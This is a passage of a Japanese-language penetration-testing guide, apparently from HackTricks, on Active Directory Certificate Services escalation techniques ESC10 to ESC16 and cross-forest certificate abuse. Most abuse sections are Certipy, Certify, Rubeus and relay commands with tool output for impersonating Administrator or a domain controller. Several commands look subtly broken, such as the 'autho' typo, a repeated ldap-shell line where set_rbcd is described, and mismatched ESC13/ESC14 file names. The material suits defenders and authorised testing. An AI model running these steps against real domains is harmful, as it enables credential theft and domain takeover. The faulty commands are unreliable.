`StrongCertificateBindingEnforcement` が `0` に設定されている場合、`GenericWrite` 権限を持つアカウント A は任意のアカウント B を侵害するために悪用できます。

例えば、`Jane@corp.local` に対して `GenericWrite` 権限を持つ場合、攻撃者は `Administrator@corp.local` を侵害することを狙えます。手順は ESC9 と同様で、任意の証明書テンプレートを利用できます。

まず、`Jane` のハッシュは Shadow Credentials を使用して取得され、`GenericWrite` を悪用します。
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
その後、`Jane`の`userPrincipalName`は`Administrator`に変更され、制約違反を避けるために`@corp.local`の部分は意図的に省略されています。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
これに続き、クライアント認証を有効にする証明書がデフォルトの `User` テンプレートを使用して `Jane` として要求されます。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`の`userPrincipalName`はその後元の`Jane@corp.local`に戻されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
取得した証明書で認証すると、`Administrator@corp.local` の NT hash が得られます。証明書にドメイン情報が含まれていないため、コマンドでドメインを指定する必要があります。
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### 悪用ケース 2

`CertificateMappingMethods` に `UPN` ビットフラグ（`0x4`）が含まれている場合、`GenericWrite` 権限を持つアカウント A は、`userPrincipalName` プロパティを持たない任意のアカウント B（マシンアカウントや組み込みのドメイン管理者 `Administrator` を含む）を侵害できます。

ここでは、`GenericWrite` を利用して Shadow Credentials を介して `Jane` のハッシュを取得することから始め、`DC$@corp.local` を侵害することを目的とします。
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`の`userPrincipalName`は次に`DC$@corp.local`に設定されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
クライアント認証用の証明書が、デフォルトの `User` テンプレートを使用して `Jane` として要求されます。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
このプロセスの後、`Jane`の`userPrincipalName`は元の値に戻ります。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel経由で認証するために、Certipyの`-ldap-shell`オプションを使用し、認証が成功すると`u:CORP\DC$`と表示されます。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP shellを通じて、`set_rbcd` のようなコマンドは Resource-Based Constrained Delegation (RBCD) 攻撃を可能にし、ドメインコントローラーを危険にさらす可能性があります。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
この脆弱性は、`userPrincipalName` が設定されていないユーザーアカウント、または `sAMAccountName` と一致しないアカウントにも及びます。デフォルトの `Administrator@corp.local` は LDAP の権限が高く、デフォルトで `userPrincipalName` が存在しないため、主要な標的となります。

## Relaying NTLM to ICPR - ESC11

### Explanation

CA Server が `IF_ENFORCEENCRYPTICERTREQUEST` で構成されていない場合、RPC サービス経由で署名なしの NTLM relay attacks を許可してしまいます。 [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

`certipy` を使用して `Enforce Encryption for Requests` が Disabled かどうかを列挙でき、certipy は `ESC11` 脆弱性を表示します。
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### 悪用シナリオ

リレーサーバーをセットアップする必要がある:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
注意: ドメインコントローラの場合、DomainController では `-template` を指定する必要があります。

または [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) を使用 :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## YubiHSM による ADCS CA へのシェルアクセス - ESC12

### 説明

管理者は証明機関 (Certificate Authority) を "Yubico YubiHSM2" のような外部デバイスに格納するように設定できます。

CA サーバーが USB ポート経由で USB デバイスに接続されている場合、あるいは CA サーバーが仮想マシンで USB デバイスサーバーを介して接続されている場合、Key Storage Provider が YubiHSM 内で鍵を生成・利用するために認証キー（しばしば "password" と呼ばれる）が必要です。

このキー/password はレジストリの `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` に平文で保存されます。

参照: [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### 悪用シナリオ

もし CA の秘密鍵が物理的な USB デバイスに保存されている状態でシェルアクセスを得た場合、その鍵を回収することが可能です。

まず、CA 証明書（これは公開情報）を取得し、その後:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
最後に、CA証明書とその秘密鍵を使って、certutil `-sign` コマンドで任意の新しい証明書を偽造します。

## OID Group Link Abuse - ESC13

### 説明

`msPKI-Certificate-Policy` 属性は、発行ポリシーを証明書テンプレートに追加できるようにします。発行ポリシーを担う `msPKI-Enterprise-Oid` オブジェクトは、PKI OID コンテナの Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) に見つかります。ポリシーはこのオブジェクトの `msDS-OIDToGroupLink` 属性を使って AD グループにリンクでき、その結果、証明書を提示したユーザーをそのグループのメンバーであるかのようにシステムが認可できるようになります。 [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

言い換えると、ユーザーが証明書を登録する権限を持ち、その証明書が OID グループにリンクされている場合、ユーザーはそのグループの権限を継承できます。

OIDToGroupLink を見つけるには [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) を使用します:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### 悪用シナリオ

使用できるユーザー権限を `certipy find` または `Certify.exe find /showAllPermissions` で探す。

もし `John` が `VulnerableTemplate` への enroll（登録）権限を持っていれば、そのユーザーは `VulnerableGroup` グループの特権を引き継げる。

やることはテンプレートを指定するだけで、OIDToGroupLink 権限を持つ証明書を取得できる。
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## 脆弱な証明書更新構成- ESC14

### 説明

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping の記述は非常に詳しいです。以下は元のテキストの引用です。

ESC14 は主に Active Directory のユーザーまたはコンピュータアカウント上の `altSecurityIdentities` 属性の誤用や安全でない構成から生じる「弱い explicit certificate mapping」に起因する脆弱性に対処します。この多値属性は、管理者が X.509 証明書を AD アカウントに手動で関連付けて認証に使用できるようにします。設定されている場合、これらの explicit mappings は通常、証明書の SAN にある UPN や DNS 名、または `szOID_NTDS_CA_SECURITY_EXT` セキュリティ拡張に埋め込まれた SID に基づくデフォルトの証明書マッピングロジックを上書きすることがあります。

「弱い」マッピングは、`altSecurityIdentities` 属性内で証明書を識別するために使用される文字列値が広すぎる、推測しやすい、ユニークでない証明書フィールドに依存している、あるいは簡単に偽造可能な証明書要素を使用している場合に発生します。攻撃者が特権アカウントのためにそのように弱く定義された explicit mapping に一致する属性を持つ証明書を入手または作成できる場合、その証明書を使ってそのアカウントとして認証し偽装することができます。

潜在的に弱い `altSecurityIdentities` マッピング文字列の例には次のようなものがあります:

- 一般的な Subject Common Name (CN) のみでマッピングする: 例 `X509:<S>CN=SomeUser`。攻撃者はこの CN を持つ証明書をより安全でないソースから入手できる可能性があります。
- 特定のシリアル番号や subject key identifier のような追加の限定がない、過度に一般的な Issuer Distinguished Name (DN) や Subject DN を使用する: 例 `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`。
- 攻撃者が合法的に入手または偽造（CA を侵害した、または ESC1 のような脆弱なテンプレートを見つけた場合）できる証明書で満たせるような、予測可能なパターンや非暗号学的識別子を使用する。

`altSecurityIdentities` 属性はマッピングのために様々な形式をサポートします。例:

- `X509:<I>IssuerDN<S>SubjectDN` (完全な Issuer と Subject DN でマップ)
- `X509:<SKI>SubjectKeyIdentifier` (証明書の Subject Key Identifier 拡張値でマップ)
- `X509:<SR>SerialNumberBackedByIssuerDN` (シリアル番号でマップ、暗黙的に Issuer DN で限定) - 通常の形式ではなく、通常は `<I>IssuerDN<SR>SerialNumber` です。
- `X509:<RFC822>EmailAddress` (SAN の RFC822 名、通常はメールアドレスでマップ)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (証明書の生の公開鍵の SHA1 ハッシュでマップ - 一般的に強力)

これらのマッピングの安全性は、マッピング文字列で使用される証明書識別子の具体性、一意性、暗号学的強度に大きく依存します。Domain Controllers 上で強力な証明書バインディングモードが有効であっても（これは主に SAN の UPN/DNS と SID 拡張に基づく暗黙のマッピングに影響します）、`altSecurityIdentities` のエントリが不適切に構成されていると、マッピングロジック自体が脆弱または許容的すぎる場合に偽装の直接的な経路を提供する可能性があります。

### 悪用シナリオ

ESC14 は Active Directory (AD) の **explicit certificate mappings**、特に `altSecurityIdentities` 属性を標的とします。この属性が設定されている（意図的または誤設定）場合、攻撃者はマッピングに一致する証明書を提示することでアカウントを偽装できます。

#### シナリオ A: 攻撃者が `altSecurityIdentities` に書き込み可能

前提: 攻撃者は対象アカウントの `altSecurityIdentities` 属性に書き込み権を持っている、または対象 AD オブジェクトに対して次のいずれかの権限を持つことでそれを付与できる。
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### シナリオ B: 対象が X509RFC822 (メール) による弱いマッピングを持つ

- 前提: 対象が altSecurityIdentities に弱い X509RFC822 マッピングを持っている。攻撃者は被害者の mail 属性を対象の X509RFC822 名に一致させ、被害者として証明書を発行（enroll）し、その証明書を使って対象として認証できる。

#### シナリオ C: 対象が X509IssuerSubject マッピングを持つ

- 前提: 対象が `altSecurityIdentities` に弱い X509IssuerSubject explicit mapping を持っている。攻撃者は被害者プリンシパルの `cn` または `dNSHostName` 属性を、対象の X509IssuerSubject マッピングの subject に一致するように設定できる。次に、攻撃者は被害者として証明書を発行し、この証明書を使って対象として認証できる。

#### シナリオ D: 対象が X509SubjectOnly マッピングを持つ

- 前提: 対象が `altSecurityIdentities` に弱い X509SubjectOnly explicit mapping を持っている。攻撃者は被害者プリンシパルの `cn` または `dNSHostName` 属性を、対象の X509SubjectOnly マッピングの subject に一致するように設定できる。次に、攻撃者は被害者として証明書を発行し、この証明書を使って対象として認証できる。

### concrete operations
#### Scenario A

証明書テンプレート `Machine` の証明書を要求する（Request a certificate of the certificate template `Machine`）。
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
証明書を保存して変換する
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
認証（証明書を使用）
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
クリーンアップ（オプション）
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
For more specific attack methods in various attack scenarios, please refer to the following: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Explanation

The description at https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc is remarkably thorough. Below is a quotation of the original text.

組み込みのデフォルトの version 1 certificate templates を使用すると、攻撃者は CSR を作成して、テンプレートで指定された Extended Key Usage 属性よりも優先される application policies を含めることができます。唯一の要件は enrollment rights であり、**_WebServer_** テンプレートを使用して client authentication、certificate request agent、codesigning 証明書を生成するために利用できます。

### Abuse

以下は [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Click to see more detailed usage methods. を参照しています。

Certipy の `find` コマンドは、CA が未パッチの場合に ESC15 の影響を受ける可能性のある V1 テンプレートを特定するのに役立ちます。
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### シナリオ A: Schannel を介した直接的ななりすまし

**ステップ 1: "Client Authentication" Application Policy とターゲット UPN を注入して証明書を要求する。** 攻撃者 `attacker@corp.local` は `administrator@corp.local` を「WebServer」V1 テンプレートを使用してターゲットにする（このテンプレートは登録者が提供した subject を許可する）。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: "Enrollee supplies subject" を持つ脆弱な V1 テンプレート。
- `-application-policies 'Client Authentication'`: CSR の Application Policies 拡張に OID `1.3.6.1.5.5.7.3.2` を注入します。
- `-upn 'administrator@corp.local'`: なりすましのために SAN に UPN を設定します。

**ステップ 2: 取得した証明書を使用して Schannel (LDAPS) 経由で認証します。**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### シナリオB: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**ステップ1: V1 テンプレート (with "Enrollee supplies subject") から証明書を要求し、"Certificate Request Agent" Application Policy を注入する。** この証明書は攻撃者（`attacker@corp.local`）が enrollment agent になるためのものである。目的は agent capability であるため、攻撃者自身の識別子には UPN は指定されていない。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1` を注入します。

**ステップ2: 対象の特権ユーザーを代理して証明書を要求するために "agent" 証明書を使用します。** これは ESC3-like な手順で、ステップ1の証明書を agent 証明書として使用します。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**ステップ 3: "on-behalf-of" 証明書を使用して特権ユーザーとして認証します。**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### 説明

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** は、AD CS の設定がすべての証明書に **szOID_NTDS_CA_SECURITY_EXT** 拡張の付加を強制していない場合に発生するシナリオを指し、攻撃者は次のように悪用できます：

1. SID binding を行わずに証明書を要求する。

2. この証明書を任意のアカウントとしての認証に使用する（例えば高権限アカウントを偽装する、例: Domain Administrator（ドメイン管理者））。

詳細な原理については次の記事も参照してください: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abuse

以下は[this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) を参照しています。詳細な使用方法はリンクをクリックしてご確認ください。

Active Directory Certificate Services (AD CS) 環境が **ESC16** に対して脆弱かどうかを識別するために
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**ステップ 1: 被害者アカウントの初期 UPN を読み取る（オプション - 復元用）。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**ステップ 2: 被害者アカウントの UPN をターゲット管理者の `sAMAccountName` に更新します。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**ステップ 3: (必要な場合) 「victim」アカウントの資格情報を取得する (例: Shadow Credentials を利用)。**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**ステップ4: ESC16 に脆弱な CA 上で、_任意の適切なクライアント認証テンプレート_（例: "User"）から "victim" ユーザーとして証明書を要求します。** CA が ESC16 に脆弱であるため、テンプレートのこの拡張に関する具体的な設定にかかわらず、発行される証明書から SID セキュリティ拡張を自動的に省略します。Kerberos credential cache 環境変数を設定します（シェルコマンド）：
```bash
export KRB5CCNAME=victim.ccache
```
次に証明書を要求する:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**ステップ5: "victim" アカウントの UPN を元に戻す。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**ステップ6: ターゲットの管理者として認証する。**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## 証明書によるフォレストの乗っ取り（受動態で説明）

### 侵害された CA によるフォレストトラストの破壊

**cross-forest enrollment** の設定は比較的簡単に行われる。管理者によって resource forest からの **root CA certificate** が **account forests に公開され**、resource forest の **enterprise CA** 証明書が各 account forest の `NTAuthCertificates` と AIA コンテナに **追加される**。つまり、この構成により resource forest の **CA** は PKI を管理する他のすべてのフォレストに対して完全な制御を与えられることになる。もしこの CA が攻撃者により侵害された場合、resource と account の各フォレストの全ユーザーの証明書が攻撃者により偽造されうるため、フォレストのセキュリティ境界は破られる。

### 外部プリンシパルに付与される登録権限

マルチフォレスト環境では、Enterprise CAs が **certificate templates** を公開し、それが **Authenticated Users や foreign principals**（Enterprise CA が属するフォレスト外のユーザー/グループ）に対して **enrollment and edit rights** を許可している場合は注意が必要である。\
トラスト越しに認証されると、AD によりユーザーのトークンに **Authenticated Users SID** が追加される。したがって、あるドメインが Enterprise CA を持ち、かつテンプレートが **Authenticated Users の enrollment 権限を許可している**場合、別フォレストのユーザーによってそのテンプレートが登録される可能性がある。同様に、テンプレートによって明示的に foreign principal に enrollment 権限が付与されている場合、**cross-forest access-control relationship** が作成され、あるフォレストのプリンシパルが別のフォレストのテンプレートに **enroll** できるようになる。

いずれのシナリオもフォレスト間で **attack surface の拡大** を招く。攻撃者は certificate template の設定を悪用して、外部ドメインで追加の特権を取得することが可能になる。

## References

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
